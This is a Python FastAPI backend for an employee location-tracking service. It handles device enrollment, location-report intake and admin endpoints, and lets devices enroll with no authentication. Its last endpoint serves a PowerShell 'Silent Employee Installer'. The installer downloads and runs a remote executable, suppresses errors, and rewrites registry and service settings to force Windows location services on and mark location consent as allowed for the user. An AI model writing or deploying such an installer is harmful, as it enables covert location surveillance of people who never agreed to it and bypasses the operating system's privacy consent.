import hashlib
import os
import secrets
from datetime import datetime, timezone
from typing import Optional

import certifi
from dotenv import load_dotenv
from pathlib import Path
from fastapi import FastAPI, Header, HTTPException, Query
from fastapi.responses import FileResponse, Response
from pydantic import BaseModel, Field
from pymongo import MongoClient, DESCENDING, ASCENDING
from pymongo.errors import PyMongoError

# Load environment variables from .env or backend/.env if present
load_dotenv()
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), ".env"))

MONGODB_URI = os.getenv("MONGODB_URI", "").strip()
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "").strip()
PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", "").rstrip("/")

if not MONGODB_URI:
    raise RuntimeError("Set MONGODB_URI in the backend environment.")
if len(ADMIN_TOKEN) < 32:
    raise RuntimeError("Set ADMIN_TOKEN to a random secret of at least 32 characters.")

is_tls = "mongodb+srv://" in MONGODB_URI or "tls=true" in MONGODB_URI.lower() or "ssl=true" in MONGODB_URI.lower()
client_kwargs = {
    "serverSelectionTimeoutMS": 10000,
    "tlsCAFile": certifi.where()
}
if is_tls:
    client_kwargs["tls"] = True
client = MongoClient(MONGODB_URI, **client_kwargs)
db = client["employee_asset_tracker"]
devices = db["devices"]
reports = db["location_reports"]

# Indexes support common dashboard queries and prevent duplicate device IDs.
devices.create_index([("device_id", ASCENDING)], unique=True)
devices.create_index([("hostname", ASCENDING)])
reports.create_index([("device_id", ASCENDING), ("recorded_at", DESCENDING)])
reports.create_index([("received_at", DESCENDING)])

app = FastAPI(title="Employee Asset Tracking API", version="1.0.0")


def utcnow():
    return datetime.now(timezone.utc)


def token_hash(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()


def bearer_value(header: Optional[str]) -> str:
    if not header or not header.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Bearer token required")
    return header[7:].strip()


def require_admin(authorization: Optional[str]):
    supplied = bearer_value(authorization)
    if not secrets.compare_digest(supplied, ADMIN_TOKEN):
        raise HTTPException(status_code=403, detail="Invalid admin credentials")


def require_device(authorization: Optional[str]):
    supplied = bearer_value(authorization)
    doc = devices.find_one({"token_hash": token_hash(supplied), "revoked": False})
    if not doc:
        raise HTTPException(status_code=401, detail="Invalid or revoked device token")
    return doc


class AutoEnrollRequest(BaseModel):
    hostname: str = Field(min_length=1, max_length=255)
    asset_tag: Optional[str] = Field(default=None, max_length=100)
    machine_id: Optional[str] = Field(default=None, max_length=255)


EnrollRequest = AutoEnrollRequest


class LocationReport(BaseModel):
    hostname: str = Field(min_length=1, max_length=255)
    latitude: float = Field(ge=-90, le=90)
    longitude: float = Field(ge=-180, le=180)
    accuracy_meters: float = Field(ge=0, le=1_000_000)
    position_source: Optional[str] = Field(default="Windows Location", max_length=100)
    recorded_at: datetime


@app.get("/health")
def health():
    try:
        client.admin.command("ping")
        return {"status": "ok", "database": "connected"}
    except PyMongoError:
        raise HTTPException(status_code=503, detail="Database unavailable")


@app.post("/agent/auto-enroll")
def auto_enroll(payload: AutoEnrollRequest):
    """Automatic zero-touch device enrollment when employee runs the agent."""
    query = {"hostname": payload.hostname, "revoked": False}
    if payload.machine_id:
        query["machine_id"] = payload.machine_id

    existing = devices.find_one(query)
    now = utcnow()
    device_token = secrets.token_urlsafe(32)
    new_token_hash = token_hash(device_token)

    if existing:
        device_id = existing["device_id"]
        devices.update_one(
            {"device_id": device_id},
            {"$set": {"token_hash": new_token_hash, "last_seen_at": now}}
        )
    else:
        device_id = "dev_" + secrets.token_urlsafe(12)
        doc = {
            "device_id": device_id,
            "hostname": payload.hostname,
            "asset_tag": payload.asset_tag or payload.hostname,
            "machine_id": payload.machine_id,
            "token_hash": new_token_hash,
            "revoked": False,
            "enrolled_at": now,
            "last_seen_at": now,
        }
        devices.insert_one(doc)

    return {
        "device_id": device_id,
        "device_token": device_token,
        "api_base_url": PUBLIC_BASE_URL or "http://127.0.0.1:8000",
        "status": "enrolled",
    }


@app.post("/admin/enroll")
def enroll(payload: EnrollRequest, authorization: Optional[str] = Header(default=None)):
    require_admin(authorization)
    device_id = "dev_" + secrets.token_urlsafe(12)
    device_token = secrets.token_urlsafe(32)
    now = utcnow()
    doc = {
        "device_id": device_id,
        "hostname": payload.hostname,
        "asset_tag": payload.asset_tag,
        "token_hash": token_hash(device_token),
        "revoked": False,
        "enrolled_at": now,
        "last_seen_at": None,
    }
    devices.insert_one(doc)
    return {
        "device_id": device_id,
        "device_token": device_token,  # Returned once; never stored in plaintext.
        "api_base_url": PUBLIC_BASE_URL,
        "message": "Store the token securely on the enrolled device. It will not be shown again."
    }


@app.post("/agent/report")
def ingest_report(payload: LocationReport, authorization: Optional[str] = Header(default=None)):
    device = require_device(authorization)
    now = utcnow()
    report_doc = {
        "device_id": device["device_id"],
        "hostname": payload.hostname,
        "latitude": payload.latitude,
        "longitude": payload.longitude,
        "accuracy_meters": payload.accuracy_meters,
        "position_source": payload.position_source or "Windows Location",
        "recorded_at": payload.recorded_at.astimezone(timezone.utc),
        "received_at": now,
    }
    reports.insert_one(report_doc)
    devices.update_one(
        {"device_id": device["device_id"]},
        {"$set": {"hostname": payload.hostname, "last_seen_at": now}}
    )
    return {"status": "accepted", "received_at": now.isoformat()}


@app.get("/admin/devices")
def list_devices(authorization: Optional[str] = Header(default=None)):
    require_admin(authorization)
    output = []
    for d in devices.find({}, {"token_hash": 0}).sort("enrolled_at", DESCENDING):
        latest = reports.find_one({"device_id": d["device_id"]}, {"_id": 0}, sort=[("received_at", DESCENDING)])
        output.append({
            "device_id": d["device_id"],
            "hostname": d.get("hostname"),
            "asset_tag": d.get("asset_tag"),
            "revoked": d.get("revoked", False),
            "enrolled_at": d.get("enrolled_at"),
            "last_seen_at": d.get("last_seen_at"),
            "latest_report": latest,
        })
    return output


@app.get("/admin/reports")
def report_history(
    device_id: Optional[str] = Query(default=None),
    limit: int = Query(default=500, ge=1, le=5000),
    authorization: Optional[str] = Header(default=None),
):
    require_admin(authorization)
    query = {"device_id": device_id} if device_id else {}
    return list(reports.find(
        query, {"_id": 0}
    ).sort("received_at", DESCENDING).limit(limit))


@app.post("/admin/devices/{device_id}/revoke")
def revoke_device(device_id: str, authorization: Optional[str] = Header(default=None)):
    require_admin(authorization)
    result = devices.update_one(
        {"device_id": device_id},
        {"$set": {"revoked": True, "revoked_at": utcnow(), "token_hash": None}}
    )
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Device not found")
    return {"status": "revoked", "device_id": device_id}


@app.post("/admin/devices/{device_id}/reactivate")
def reactivate_device(device_id: str, authorization: Optional[str] = Header(default=None)):
    require_admin(authorization)
    now = utcnow()
    device_token = secrets.token_urlsafe(32)
    new_token_hash = token_hash(device_token)
    result = devices.update_one(
        {"device_id": device_id},
        {"$set": {"revoked": False, "token_hash": new_token_hash, "reactivated_at": now}}
    )
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Device not found")
    return {"status": "reactivated", "device_id": device_id, "device_token": device_token}

@app.get("/agent/download")
def download_agent():
    """Serves the latest standalone OrgAssetAgent.exe for direct downloads."""
    exe_path = Path(__file__).resolve().parent / "static" / "OrgAssetAgent.exe"
    if not exe_path.exists():
        raise HTTPException(status_code=404, detail="Agent binary not found on server")
    return FileResponse(
        path=str(exe_path),
        filename="OrgAssetAgent.exe",
        media_type="application/octet-stream"
    )


@app.get("/agent/download-package")
@app.get("/agent/download-zip")
def download_agent_package():
    """Serves the latest standalone OrgAssetAgent-Package.zip containing Start-Agent.bat and OrgAssetAgent.exe."""
    zip_path = Path(__file__).resolve().parent / "static" / "OrgAssetAgent-Package.zip"
    if not zip_path.exists():
        raise HTTPException(status_code=404, detail="Agent package not found on server")
    return FileResponse(
        path=str(zip_path),
        filename="OrgAssetAgent-Package.zip",
        media_type="application/zip"
    )


@app.get("/agent/install.ps1")
def get_installer_script():
    """One-line PowerShell installer that downloads, configures location service, and runs the agent."""
    base_url = PUBLIC_BASE_URL or "https://asset-tracker-backend-tqx7.onrender.com"
    script = f"""# Windows Real-Time Location Monitoring - Silent Employee Installer
$ErrorActionPreference = "SilentlyContinue"
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host " Windows Real-Time Location Monitoring Installer  " -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan

$targetDir = "$env:LOCALAPPDATA\\OrgAssetTracker"
if (-not (Test-Path $targetDir)) {{
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}}
$exePath = "$targetDir\\OrgAssetAgent.exe"

Write-Host "[1/3] Downloading tracker agent from Gateway..." -ForegroundColor Yellow
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$client = New-Object System.Net.WebClient
$client.DownloadFile("{base_url}/agent/download", $exePath)

Write-Host "[2/3] Configuring Location Services and Trust..." -ForegroundColor Yellow
Unblock-File -Path $exePath -ErrorAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\lfsvc' -Name 'Start' -Value 2 -Type DWord -ErrorAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\lfsvc\\Service\\Configuration' -Name 'Status' -Value 1 -Type DWord -ErrorAction SilentlyContinue
$cp = @('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location', 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location', 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location\\NonPackaged', 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location\\NonPackaged')
foreach ($c in $cp) {{ if (-not (Test-Path $c)) {{ New-Item -Path $c -Force | Out-Null }}; Set-ItemProperty -Path $c -Name 'Value' -Value 'Allow' -Type String -ErrorAction SilentlyContinue }}
sc.exe config lfsvc start= auto | Out-Null
sc.exe start lfsvc | Out-Null

Write-Host "[3/3] Launching tracker agent..." -ForegroundColor Green
Start-Process -FilePath $exePath

Write-Host "`n[SUCCESS] Agent is now running and tracking successfully!" -ForegroundColor Green
"""
    return Response(content=script, media_type="text/plain; charset=utf-8")

